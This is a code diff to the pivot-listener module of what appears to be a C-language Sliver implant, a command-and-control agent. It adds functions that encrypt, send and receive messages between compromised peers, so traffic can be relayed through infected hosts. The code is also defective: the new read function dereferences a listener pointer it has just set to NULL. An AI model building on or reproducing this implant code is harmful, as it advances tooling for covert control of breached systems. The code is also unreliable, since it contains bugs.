@@ -329,6 +329,47 @@ VOID FreePivotConnection
 	}
 }
 
+BOOL WriteEnvelopeToPeer
+(
+	_In_ PPIVOT_CONNECTION pConnection,
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PBUFFER pMarshaledEnvelope = NULL;
+	PBUFFER pCiphertext = NULL;
+	BOOL Result = FALSE;
+	PPIVOT_LISTENER pListener = NULL;
+
+	pMarshaledEnvelope = MarshalEnvelope(pEnvelope);
+	pCiphertext = SliverEncrypt(pConnection->SessionKey, pMarshaledEnvelope);
+	pListener = pConnection->pListener;
+	Result = pListener->RawSend(pConnection->lpDownstreamConn, pCiphertext);
+CLEANUP:
+	FreeBuffer(pMarshaledEnvelope);
+	FreeBuffer(pCiphertext);
+
+	return Result;
+}
+
+PENVELOPE ReadEnvelopeFromPeer
+(
+	_In_ PPIVOT_CONNECTION pConnection
+)
+{
+	PPIVOT_LISTENER pListener = NULL;
+	PBUFFER pRecvData = NULL;
+	PENVELOPE pResult = NULL;
+
+	pRecvData = pListener->RawRecv(pConnection->lpDownstreamConn);
+	if (pRecvData == NULL) {
+		goto CLEANUP;
+	}
+
+	pResult = UnmarshalEnvelope(pRecvData);
+CLEANUP:
+	return pResult;
+}
+
 VOID PivotConnectionStart
 (
 	_In_ PPIVOT_CONNECTION pConnection
@@ -348,6 +389,13 @@ VOID PivotConnectionStart
 
 	pListener = pConnection->pListener;
 	pConfig = pListener->pConfig;
+	if (pListener->Connections == NULL) {
+		pListener->Connections = ALLOC(sizeof(PPIVOT_CONNECTION));
+	}
+	else {
+		pListener->Connections = REALLOC(pListener->Connections, sizeof(PPIVOT_CONNECTION) * (pListener->dwNumberOfConnections + 1));
+	}
+
 	pListener->Connections[pListener->dwNumberOfConnections++] = pConnection;
 	while (TRUE) {
 		if (pConnection->IsExiting) {
@@ -359,7 +407,7 @@ VOID PivotConnectionStart
 			pEnvelope = NULL;
 		}
 
-		pEnvelope = pListener->RecvEnvelope(pConfig, pConnection->lpDownstreamConn);
+		pEnvelope = ReadEnvelopeFromPeer(pConnection);
 		if (pEnvelope == NULL) {
 			continue;
 		}
@@ -369,7 +417,7 @@ VOID PivotConnectionStart
 			pSendEnvelope->uType = MsgPivotPeerPing;
 			pSendEnvelope->pData = pEnvelope->pData;
 			pEnvelope->pData = NULL;
-			pListener->SendEnvelope(pConfig, pConnection->lpDownstreamConn, pSendEnvelope);
+			WriteEnvelopeToPeer(pConnection, pSendEnvelope);
 			FreeEnvelope(pSendEnvelope);
 			//= MarshalEnvelope()
 		}
@@ -419,6 +467,7 @@ VOID ListenerMainLoop
 
 		pNewConnection = pListener->Accept(pListener);
 		if (pNewConnection == NULL) {
+			Sleep(5000);
 			continue;
 		}
 
